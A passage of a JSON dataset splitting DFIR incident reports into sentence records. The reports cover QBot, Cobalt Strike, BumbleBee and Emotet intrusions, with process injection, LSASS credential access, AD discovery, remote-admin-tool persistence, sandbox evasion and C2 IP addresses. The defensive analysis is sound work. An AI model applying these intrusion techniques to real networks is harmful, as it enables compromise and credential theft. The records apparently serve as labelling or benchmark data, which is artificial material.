        "id": "dfir-reports-filtered/r-dfir-8.md:::S57",
        "text": "The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit).",
        "type": "",
        "report": "r-dfir-8",
        "line": 57,
        "index": 4591
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S58",
        "text": "An example event can be seen below.",
        "type": "",
        "report": "r-dfir-8",
        "line": 58,
        "index": 4592
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S59",
        "text": "Source PID 11672 belonging to QBot, injected a DLL into PID 3592, which we discovered was part of Cobalt Strike C2 communication\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 59,
        "index": 4593
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S60",
        "text": "Using the injected process id\u2019s, and process names, we can then match that to the network connections observed using the volatility netscan module, discovering both the injected Qbot (PID 3992) and Cobalt strike (PID 5620) explorer processes.",
        "type": "",
        "report": "r-dfir-8",
        "line": 60,
        "index": 4594
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S61",
        "text": "(The data below comes from a different host than the prior log.)\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 61,
        "index": 4595
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S62",
        "text": "Various folders were added as an exclusion for Windows Defender, commonly used by QBot, as a \u2018drop zone\u2019 for both execution and persistence.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 62,
        "index": 4596
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S63",
        "text": "Qbot attempted to steal credentials from the Credentials Manager.",
        "type": "",
        "report": "r-dfir-8",
        "line": 63,
        "index": 4597
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S64",
        "text": "On one of the targeted systems, the injected explorer process opened a handle with suspicious access rights to a thread in the LSASS process.",
        "type": "",
        "report": "r-dfir-8",
        "line": 64,
        "index": 4598
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S65",
        "text": "Credential dumping tools like Mimikatz often request this level of access and corresponds to the following access rights:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 65,
        "index": 4599
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S66",
        "text": "We observed the LSASS process interaction from the injected Explorer process at two different access levels, 0x1410:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 66,
        "index": 4600
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S67",
        "text": "In addition, on one host, the average LSASS interaction, with access right 0x1FFFFF (PROCESS_ALL_ACCESS) by the explorer process was ~13K every two hours.",
        "type": "",
        "report": "r-dfir-8",
        "line": 67,
        "index": 4601
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S68",
        "text": "A significant volume of events.",
        "type": "",
        "report": "r-dfir-8",
        "line": 68,
        "index": 4602
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S69",
        "text": "The article \u201cYou Bet Your Lsass: Hunting LSASS Access\u201d by Splunk details examples of LSASS credential dumping.",
        "type": "",
        "report": "r-dfir-8",
        "line": 69,
        "index": 4603
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S70",
        "text": "The following discovery commands were initiated by Qbot through the injected process on the beachhead system:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 70,
        "index": 4604
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S71",
        "text": "Later, more discovery commands were observed from the Cobalt Strike injected process on another victim system:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 71,
        "index": 4605
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S72",
        "text": "On the same host, AdFind was executed to enumerate all computer objects in the Active Directory domain:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 72,
        "index": 4606
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S73",
        "text": "On second day of the intrusion, threat attackers downloaded a tool named Network Scanner (netscan.exe) by SoftPerfect on the domain controller, using Internet Explorer.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 73,
        "index": 4607
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S74",
        "text": "The tool was used to trigger another port scan, this time targeting TCP ports 445 and 3389.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 74,
        "index": 4608
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S75",
        "text": "Periodic requests to api.ipify.org were observed throughout the intrusion by the SysWOW64\\Explorer process and by the ATERA agent.",
        "type": "",
        "report": "r-dfir-8",
        "line": 75,
        "index": 4609
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S76",
        "text": "Ipify.org can be used to determine the public facing IPv4 address of the network.",
        "type": "",
        "report": "r-dfir-8",
        "line": 76,
        "index": 4610
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S77",
        "text": "We\u2019ve observed the use of ipify.org in previous cases.",
        "type": "",
        "report": "r-dfir-8",
        "line": 77,
        "index": 4611
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S78",
        "text": "Qbot DLLs were created remotely from the beachhead host and saved in the administrative C$ share of other hosts within the network.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 78,
        "index": 4612
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S79",
        "text": "This activity was also clearly visible in Zeek SMB File data in the network.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 79,
        "index": 4613
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S80",
        "text": "A local service was also registered on each of the targeted systems, configured to execute the Qbot DLL using regsvr32.exe\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 80,
        "index": 4614
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S81",
        "text": "The following Suricata signatures identified both the remote file creation and service registration events:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 81,
        "index": 4615
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S82",
        "text": "Execution of the new service was observed shorty after invoking the Qbot DLL.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 82,
        "index": 4616
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S83",
        "text": "The threat actor also used RDP to pivot between systems on the network such as a domain controller and a file server.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 83,
        "index": 4617
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S84",
        "text": "The creation of the rdpclip.exe process on the target host is another indication that a RDP connection was successful.",
        "type": "",
        "report": "r-dfir-8",
        "line": 84,
        "index": 4618
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S85",
        "text": "The start of this process by a non-human account is another great detection opportunity.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 85,
        "index": 4619
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S86",
        "text": "Qbot used various information stealing modules to extract sensitive information from the beachhead host.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 86,
        "index": 4620
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S87",
        "text": "Outlook was started, possibly to steal e-mail messages.",
        "type": "",
        "report": "r-dfir-8",
        "line": 87,
        "index": 4621
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S88",
        "text": "However, we could not find evidence to conclusively support this.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 88,
        "index": 4622
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S89",
        "text": "Qbot also used the Windows built-in utility esentutl.exe to extract browser data from Internet Explorer and Microsoft Edge:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 89,
        "index": 4623
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S90",
        "text": "On a file server, we observed the threat actor manually inspecting files using various built-in viewers.",
        "type": "",
        "report": "r-dfir-8",
        "line": 90,
        "index": 4624
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S91",
        "text": "For example, for viewing PDF files, Internet Explorer was used to view these files.",
        "type": "",
        "report": "r-dfir-8",
        "line": 91,
        "index": 4625
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S92",
        "text": "For DOCX files, WordPad was used.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 92,
        "index": 4626
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S93",
        "text": "An indication that these files were viewed locally on the network, was the presence of the \u2018OpenWith\u2019 process:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 93,
        "index": 4627
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S94",
        "text": "The following C2 IP-addresses/domains belonging to Qbot were recorded during this intrusion:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 94,
        "index": 4628
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S95",
        "text": "The (default) named pipe postex_4c14 was observed from a Cobalt Strike injected explore.exe process.",
        "type": "",
        "report": "r-dfir-8",
        "line": 95,
        "index": 4629
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S96",
        "text": "After dumping one of the injected explorer.exe processes, we were able to extract the beacon configuration using the 1768.py tool, by Didier Stevens.",
        "type": "",
        "report": "r-dfir-8",
        "line": 96,
        "index": 4630
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S97",
        "text": "More details about this IP-address:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 97,
        "index": 4631
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S98",
        "text": "Cobalt Strike config:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 98,
        "index": 4632
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S99",
        "text": "The remote admin tool named client32.exe (NetSupport Manager) and its associated libraries were dropped on a workstation in the C:\\ProgramData\\MSN Devices directory.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 99,
        "index": 4633
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S100",
        "text": "The exchanged network traffic was unencrypted and contained the custom user-agent NetSupport Manager/1.3\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 100,
        "index": 4634
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S101",
        "text": "The threat actor installed and enabled the Atera RMM agent on the domain controller.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 101,
        "index": 4635
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S102",
        "text": "The MSI installer, named setup_undefined.msi was configured to drop the installation files in the C:\\Program Files\\ATERA Networks\\AteraAgent directory.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 102,
        "index": 4636
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S103",
        "text": "Atera integrated with another remote admin tool known as \u201cSplashTop\u201c, which it dropped on the file system.",
        "type": "",
        "report": "r-dfir-8",
        "line": 103,
        "index": 4637
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S104",
        "text": "Periodic \u2018heartbeat\u2019 process events of Atera were observed:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 104,
        "index": 4638
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S105",
        "text": "The \u201cSplashtop\u201d remote admin tool was started as a background process.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 105,
        "index": 4639
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S106",
        "text": "Both remote admin tools allowed the threat actors to persist and obtain remote access to the environment, without relying on RDP.",
        "type": "",
        "report": "r-dfir-8",
        "line": 106,
        "index": 4640
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S107",
        "text": "The Atera Agent account used was retained in the host Software registry hive:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 107,
        "index": 4641
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S108",
        "text": "No exfiltration observed.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 108,
        "index": 4642
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S109",
        "text": "Sensitive documents (.pdf, .docx) were viewed in a RDP session on the file server using Notepad++ and Wordpad.",
        "type": "",
        "report": "r-dfir-8",
        "line": 109,
        "index": 4643
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S110",
        "text": "After this, no further activity from the threat actor was observed.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 110,
        "index": 4644
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S0",
        "text": "The intrusion began with the delivery of an ISO file containing a LNK file and a BumbleBee payload in the form of a hidden DLL file.",
        "type": "",
        "report": "r-dfir-9",
        "line": 0,
        "index": 4645
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S1",
        "text": "A user on a workstation mounted the ISO file and executed the LNK file, running the Bumblebee payload.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 1,
        "index": 4646
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S2",
        "text": "Around 15 minutes after the execution of BumbleBee, multiple processes were spawned with the goal of injecting Meterpreter into each of them.",
        "type": "",
        "report": "r-dfir-9",
        "line": 2,
        "index": 4647
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S3",
        "text": "After the threat actors gained access with Meterpreter, they began conducting reconnaissance on the workstation and network, including querying domain controllers, mapping domain joined computers, enumerating Active Directory trusts, and listing Domain Admin accounts.",
        "type": "",
        "report": "r-dfir-9",
        "line": 3,
        "index": 4648
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S4",
        "text": "All of this first wave of discovery relied on built in Windows utilities like nltest, arp, net, ping, nbtstat, and nslookup.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 4,
        "index": 4649
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S5",
        "text": "BumbleBee executed under a user with local administrator privileges on all workstations in the environment.",
        "type": "",
        "report": "r-dfir-9",
        "line": 5,
        "index": 4650
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S6",
        "text": "At around six hours after initial execution, we observed a new process created that was then used to host a Cobalt Strike beacon, from the same command and control server observed in a prior BumbleBee case.",
        "type": "",
        "report": "r-dfir-9",
        "line": 6,
        "index": 4651
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S7",
        "text": "This beacon reprised discovery activity, but also cut a common command short net user /dom instead of /domain , whether from keyboard laziness or a trick to trip-up detections.",
        "type": "",
        "report": "r-dfir-9",
        "line": 7,
        "index": 4652
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S8",
        "text": "The threat actor then used their access to execute procdump via a remote service creation with the intention of dumping credentials from LSASS from an adjacent workstation on the network.",
        "type": "",
        "report": "r-dfir-9",
        "line": 8,
        "index": 4653
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S9",
        "text": "Next, the threat actors moved laterally via RDP to a server.",
        "type": "",
        "report": "r-dfir-9",
        "line": 9,
        "index": 4654
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S10",
        "text": "A new local user, sql_admin, was created and added to the local administrator\u2019s group and AnyDesk remote access software was installed.",
        "type": "",
        "report": "r-dfir-9",
        "line": 10,
        "index": 4655
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S11",
        "text": "Through the AnyDesk session, the threat actor was observed connecting to a file share and accessing multiple documents related to cyber insurance and spreadsheets with passwords.",
        "type": "",
        "report": "r-dfir-9",
        "line": 11,
        "index": 4656
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S12",
        "text": "A second round of enumeration was observed on the beachhead using AdFind, which was executed via the Cobalt Strike beacon on the system.",
        "type": "",
        "report": "r-dfir-9",
        "line": 12,
        "index": 4657
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S13",
        "text": "Following this second round of enumeration, the threat actor moved latterly to a server hosting backups, via RDP and interacted with the backup console.",
        "type": "",
        "report": "r-dfir-9",
        "line": 13,
        "index": 4658
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S14",
        "text": "From the backup system, the threat actors also opened internet explorer and attempted to load the environment\u2019s mail server, likely checking for Outlook Web Access.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 14,
        "index": 4659
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S15",
        "text": "A third round of enumeration, this time taking place from the first lateral server host, was observed via a script named \u20181.bat\u2019 that would ping all computers in the environment.",
        "type": "",
        "report": "r-dfir-9",
        "line": 15,
        "index": 4660
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S16",
        "text": "Following this third round of enumeration the threat actors were evicted from the environment and no further impact was observed.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 16,
        "index": 4661
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S17",
        "text": "We assess with medium confidence this intrusion was related to pre-ransomware activity due to the tool set and techniques the actor displayed.",
        "type": "",
        "report": "r-dfir-9",
        "line": 17,
        "index": 4662
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S18",
        "text": "The BumbleBee malware has been following the trend of using the effective combination of utilizing an .iso image containing a .lnk and .dll file.",
        "type": "",
        "report": "r-dfir-9",
        "line": 18,
        "index": 4663
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S19",
        "text": "We have observed the same behavior with other major malware distributors in previous reports:\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 19,
        "index": 4664
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S20",
        "text": "Using the event log, \u201cMicrosoft-Windows-VHDMP-Operational.evtx\u201d, we can quickly find when the user mounted the .iso.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 20,
        "index": 4665
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S21",
        "text": "Upon clicking the LNK file the BumbleBee payload was executed.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 21,
        "index": 4666
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S22",
        "text": "Following the user mounting the .iso file, they clicked on a .lnk file documents.lnk .",
        "type": "",
        "report": "r-dfir-9",
        "line": 22,
        "index": 4667
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S23",
        "text": "As noted in previous reports, the .dll is hidden from the user unless they display hidden items in explorer like so:\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 23,
        "index": 4668
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S24",
        "text": "The .lnk contains instructions to execute a specific exported function with the BumbleBee DLL file.",
        "type": "",
        "report": "r-dfir-9",
        "line": 24,
        "index": 4669
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S25",
        "text": "When the .lnk was doubled clicked by the user, the BumbleBee malware tamirlan.dll was executed:\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 25,
        "index": 4670
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S26",
        "text": "The output of LECmd.exe, when used on documents.lnk , provided additional context to where and when this .lnk file was created:\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 26,
        "index": 4671
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S27",
        "text": ">> Tracker database block Machine ID: user-pc MAC Address: 9a:5b:d6:3e:47:ec MAC Vendor: (Unknown vendor) Creation: <REDACTED DATE>\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 27,
        "index": 4672
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S28",
        "text": "Approximately 5 seconds after execution, the rundll32.exe process contacted the IP 154.56.0.221 .",
        "type": "",
        "report": "r-dfir-9",
        "line": 28,
        "index": 4673
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S29",
        "text": "More information on this traffic is covered in the Command and Control section below.",
        "type": "",
        "report": "r-dfir-9",
        "line": 29,
        "index": 4674
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S30",
        "text": "An interesting tactic of note, was the use of WMI and COM function calls to start the process, used to inject into.",
        "type": "",
        "report": "r-dfir-9",
        "line": 30,
        "index": 4675
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S31",
        "text": "The BumbleBee loader uses WMI to start new process by calling COM functions to create a new process.",
        "type": "",
        "report": "r-dfir-9",
        "line": 31,
        "index": 4676
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S32",
        "text": "Below you can see the COM instance creation followed by defining the WMI namespace and WMI object being created \u2013 \u201cWin32_Process\u201d.",
        "type": "",
        "report": "r-dfir-9",
        "line": 32,
        "index": 4677
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S33",
        "text": "Analysis of the loader found that a function of the malware chooses 1 of 3 target processes before injecting the supplied code:\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 33,
        "index": 4678
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S34",
        "text": "This resulted in new processes not being a child of BumbleBee, but rather WmiPrvSE.exe.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 34,
        "index": 4679
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S35",
        "text": "In this intrusion, an instance of C:\\Program Files\\Windows Photo Viewer\\ImagingDevices.exe was created and accessed by the BumbleBee rundll32.exe process.",
        "type": "",
        "report": "r-dfir-9",
        "line": 35,
        "index": 4680
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S36",
        "text": "Shortly after this interaction, the process started communicating to a Meterpreter C2 3.85.198.66 .",
        "type": "",
        "report": "r-dfir-9",
        "line": 36,
        "index": 4681
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S37",
        "text": "This process spawned cmd.exe and several typical discovery commands that are covered in more detail below.",
        "type": "",
        "report": "r-dfir-9",
        "line": 37,
        "index": 4682
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S38",
        "text": "The second process, was spawned the WMI technique was an instance of C:\\Program Files\\Windows Mail\\wabmig.exe .",
        "type": "",
        "report": "r-dfir-9",
        "line": 38,
        "index": 4683
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S39",
        "text": "This process was used to host both a session to another Meterpreter C2 50.16.62.87 and a Cobalt Strike C2 server 45.153.243.142, which was then used to conduct the majority of additional activity including credential dumping and discovery exercises highlighted below.",
        "type": "",
        "report": "r-dfir-9",
        "line": 39,
        "index": 4684
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S40",
        "text": "The pivot to using Cobalt Strike began around 6 hours after the execution of the BumbleBee loader.",
        "type": "",
        "report": "r-dfir-9",
        "line": 40,
        "index": 4685
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S41",
        "text": "A new local administrator user was created on a server to facilitate persistence on the machine.",
        "type": "",
        "report": "r-dfir-9",
        "line": 41,
        "index": 4686
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S42",
        "text": "The user account was observed to be accessed via an AnyDesk session on the same machine.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 42,
        "index": 4687
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S43",
        "text": "In addition, AnyDesk was installed as a service:\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 43,
        "index": 4688
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S44",
        "text": "The BumbleBee loader itself uses several defense evasion and anti-analysis techniques.",
        "type": "",
        "report": "r-dfir-9",
        "line": 44,
        "index": 4689
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S45",
        "text": "As detailed in the Execution section, the use of WMI to spawn new processes is a known technique to evade any parent/child process heuristics or detections.",
        "type": "",
        "report": "r-dfir-9",
        "line": 45,
        "index": 4690
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S46",
        "text": "Once the malware is unpacked, it becomes quite apparent to what the malware author(s) were looking for\u2013\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 46,
        "index": 4691
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S47",
        "text": "Known malware analysis process names running:\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 47,
        "index": 4692
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S48",
        "text": "Known sandbox usernames (Sorry if your name is Peter Wilson, no malware for you \ud83d\ude1f):\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 48,
        "index": 4693
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S49",
        "text": "Specific Virtualization Software files on disk and registry keys (Virtual Box, Qemu, Parallels), example:\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 49,
        "index": 4694
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S50",
        "text": "Create Remote Thread \u2013 The malware used the win32 function CreateRemoteThread in order to execute code in rundll32.exe.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 50,
        "index": 4695
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S51",
        "text": "Named Pipes \u2013 Two named pipes were created in order to establish inter-process communications (IPC) between rundll32.exe and wabmig.exe.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 51,
        "index": 4696
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S52",
        "text": "A remote service was created on one of the workstations in order to dump lsass.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 52,
        "index": 4697
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S53",
        "text": "The first discovery stage includes TTPs that we have seen in multiple cases, such as trusts discovery, domain admin group discovery, network discovery and process enumeration.",
        "type": "",
        "report": "r-dfir-9",
        "line": 53,
        "index": 4698
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S54",
        "text": "AdFind.exe was renamed to af.exe and was used by threat actors in order to enumerate AD users, computers, OU, trusts, subnets and groups.",
        "type": "",
        "report": "r-dfir-9",
        "line": 54,
        "index": 4699
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S55",
        "text": "The threat actor was observed moving via RDP throughout the network with a Domain Admin account.",
        "type": "",
        "report": "r-dfir-9",
        "line": 55,
        "index": 4700
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S56",
        "text": "As mentioned in Credential Access, the threat actor used remote services to execute commands on remote hosts.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 56,
        "index": 4701
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S57",
        "text": "SMB was used to transfer the various tools laterally, as needed in the environment, like procdump.exe and AnyDesk executables.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 57,
        "index": 4702
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S58",
        "text": "The threat actor accessed multiple documents and folders from a remote file server.",
        "type": "",
        "report": "r-dfir-9",
        "line": 58,
        "index": 4703
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S59",
        "text": "The SMB share was accessed through a compromised server via an AnyDesk session.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 59,
        "index": 4704
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S60",
        "text": "The lsass dump file ran remotely, was copied to the beachhead through the admin share C$.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 60,
        "index": 4705
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S61",
        "text": "After being copied, the file was zipped using 7za.exe (7-zip), in preparation for exfiltration.",
        "type": "",
        "report": "r-dfir-9",
        "line": 61,
        "index": 4706
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S62",
        "text": "This C2 server was observed in a previous BumbleBee case.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 62,
        "index": 4707
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S63",
        "text": "AnyDesk was installed to facilitate interactive desktop command and control access to a server in the environment.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 63,
        "index": 4708
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S64",
        "text": "Reviewing the ad_svc.trace logs from Anydesk located in %programdata%\\AnyDesk reveal the logins originating from 108.177.235.25.",
        "type": "",
        "report": "r-dfir-9",
        "line": 64,
        "index": 4709
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S65",
        "text": "This was again the same IP observered in the prior Bumblebee case.",
        "type": "",
        "report": "r-dfir-9",
        "line": 65,
        "index": 4710
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S66",
        "text": "The Client-ID observed in the logs was 892647610\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 66,
        "index": 4711
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S67",
        "text": "No exfiltration methods were observed beyond the established command and control channels, which can be assessed as likely used to take data like the lsass dump out of the network.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 67,
        "index": 4712
    },
    {
        "id": "dfir-reports-filtered/r-dfir-9.md:::S68",
        "text": "The threat actors were evicted from the network before any further impact.\n",
        "type": "",
        "report": "r-dfir-9",
        "line": 68,
        "index": 4713
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S0",
        "text": "Back in May, we witnessed an intrusion that started from a phishing email which included Emotet.",
        "type": "",
        "report": "r-dfir-10",
        "line": 0,
        "index": 4714
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S1",
        "text": "The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 1,
        "index": 4715
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S2",
        "text": "The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months.",
        "type": "",
        "report": "r-dfir-10",
        "line": 2,
        "index": 4716
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S3",
